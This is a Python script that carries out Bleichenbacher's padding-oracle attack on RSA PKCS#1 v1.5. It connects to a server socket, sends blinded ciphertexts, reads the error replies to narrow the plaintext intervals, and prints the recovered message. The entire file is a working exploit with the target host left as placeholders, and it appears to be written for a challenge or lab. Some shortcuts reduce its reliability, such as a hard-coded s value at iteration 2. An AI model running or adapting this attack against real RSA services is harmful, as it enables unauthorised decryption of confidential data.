import socket
from math import ceil

# Here you can add the domain name and the port of the server
# domain_name =  
# port =  

def fusion_sort(L):
    if len(L)==1:
        return L
    else:
        if len(L)%2==0:
            L1 = fusion_sort(L[:len(L)//2])
            L2 = fusion_sort(L[len(L)//2:])
        else:
            L1 = fusion_sort(L[:len(L)//2+1])
            L2 = fusion_sort(L[len(L)//2+1:])
        indexL1 = 0
        indexL2 = 0
        sortedList = []
        while indexL1<len(L1) and  indexL2<len(L2):
            if L1[indexL1][0]<L2[indexL2][0]:
                sortedList.append(L1[indexL1])
                indexL1+=1
            else:
                sortedList.append(L2[indexL2])
                indexL2+=1
        if indexL1<len(L1):
            sortedList.extend(L1[indexL1:])
        elif indexL2<len(L2):
            sortedList.extend(L2[indexL2:])
        return sortedList


def reduce_set(M,s,iteration,B,N):
    # just test values for the union 
    # future_M = [[1,5],[4,6],[9,10],[6,8],[10,16],[2,17],[18,100]]
    future_M = []
    for i in range(len(M[iteration-1])):
        a = M[iteration-1][i][0]
        b = M[iteration-1][i][1]
        lower_bound = (a*s[iteration]-3*B+1)//N if (a*s[iteration]-3*B+1)%N==0 else (a*s[iteration]-3*B+1)//N+1
        upper_bound = (b*s[iteration]-2*B)//N
        # Here upper_bound+1 because we need to respect n<=upper_bound
        print(lower_bound)
        print(upper_bound)
        r=lower_bound
        while(r<=upper_bound):
            a1 = (2*B+r*N)//s[iteration] if (2*B+r*N)%s[iteration]==0 else (2*B+r*N)//s[iteration]+1
            b1 = (3*B-1+r*N)//s[iteration]
            future_M.append([max(a,a1),min(b,b1)])
            r+=1
        if len(future_M)>1:
            future_M = fusion_sort(future_M)
            already_added = [False for _ in range(len(future_M))]
            fusioned = []
            tmp = -1
            for i in range(len(future_M)):
                if not already_added[i]:
                    fusioned.append(future_M[i])
                    already_added[i]=True
                    tmp+=1
                    for j in range(i+1,len(future_M)):
                        print(fusioned)
                        if (not already_added[j]) and fusioned[tmp][1]>=future_M[j][0] and future_M[j][1]>fusioned[tmp][1]:
                            fusioned[tmp][1] = future_M[j][1]
                            already_added[j] = True
                        elif (not already_added[j]) and fusioned[tmp][1]>=future_M[j][0] and future_M[j][1]<=fusioned[tmp][1]:
                            already_added[j] = True 
        else:
            fusioned=future_M
    return fusioned


def search_si(M,c0,s,e,N,iteration):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
        sock.connect((domain_name, port))
        if iteration==1:
            print("[+] Launching the search with step 2A")
            s1 = ceil((N+2*B)/(3*B-1))
            while True : 
                c1 = pow(c0*pow(s1,e,N),1,N)
                c1_bytes = int.to_bytes(c1,(c1.bit_length()+7)//8,'big')
                sock.sendall(c1_bytes)
                answer = sock.recv(1024).decode('utf-8')
                if 'error' not in answer :
                    print("[+] We found the first integer to make c1 PKCS#1 conforming")
                    print(answer)
                    return s1
                s1+=1
                if s1 % 1000 ==0:
                    print(s1)
        elif iteration>1 and len(M[iteration-1])>=2:
            s_i = s[iteration-1]+1
            print("[+] We are now in step 2B, looking for a new si")
            if iteration ==2:
                return 142652
            else : 
                while True : 
                        c = pow(c0*pow(s_i,e,N),1,N)
                        c_bytes = int.to_bytes(c,(c.bit_length()+7)//8,'big')
                        sock.sendall(c_bytes)
                        answer = sock.recv(1024).decode('utf-8')
                        if 'error' not in answer :
                            print("[+] We found the integer s" + str(iteration)+" to make c0 PKCS#1 conforming")
                            print(answer)
                            return s_i
                        s_i+=1
                        if s_i % 1000 ==0:
                            print(s_i)
        elif len(M[iteration-1])==1:
            print("[+] Searching with one intervall left !")
            r_i = (2*(M[iteration-1][0][1]*s[iteration-1]-2*B))//N + (1 if (2*(M[iteration-1][0][1]*s[iteration-1]-2*B))%N!=0 else 0)
            while True:
                # I choose not to use fractions, because we can find integers in a intervall between two non integers
                div = (2*B+r_i*N)//M[iteration-1][0][1]
                mod = (2*B+r_i*N)%M[iteration-1][0][1]
                lower_bound = div if mod==0 else div+1
                div = (3*B+r_i*N)//M[iteration-1][0][0]
                mod = (3*B+r_i*N)%M[iteration-1][0][0]
                upper_bound = div 
                for s_i in range(lower_bound,(upper_bound if mod==0 else div+1)):
                    c = pow(c0*pow(s_i,e,N),1,N)
                    c_bytes = int.to_bytes(c,(c.bit_length()+7)//8,'big')
                    sock.sendall(c_bytes)
                    answer = sock.recv(1024).decode('utf-8')
                    if 'error' not in answer :
                        print("[+] We found an integer to make c1 PKCS#1 conforming")
                        print(answer)
                        return s_i
                if r_i%1000==0:
                    print('[+] Here is the current ri value ', r_i)
                r_i+=1

    


if __name__ == "__main__":
    
    # Here you can add the public parameters of the RSA key 
    #e = 
    #N = 
    #size of N is 2048 bits => k = 256 because k in the formula is the size of N in bytes
    k = (N.bit_length() +7)//8

    #different valid ciphertexts
    ciphertexts = []
    # different random integers
    s = []
    # sets 
    M = []
    iteration = 0

    #initialisation
    # in my case of the attack I already had a valid ciphertext 
    # here we already have a valid ciphertext
    # c0 = 
    
    test_c0 = pow(c0*pow(1,e,N),1,N)
    s.append(1)
    B = pow(2,8*(k-2))
    M.append([[2*B, 3*B-1]])
    iteration = 1

    while True:
        print("[+] s values in iteration ", iteration)
        #print(s)
        print("[+] M values in iteration ", iteration, len(M))
        #print(M)
        s.append(search_si(M,c0,s,e,N,iteration))
        M.append(reduce_set(M,s,iteration,B,N))
        if len(M[-1])==1 and M[-1][0][0]==M[-1][0][1]:
            decoded_message = pow(M[-1][0][0]*pow(1,-1,N),1,N)
            print(int.to_bytes(decoded_message,(decoded_message.bit_length()+7)//8,'big'))
            break
        iteration+=1

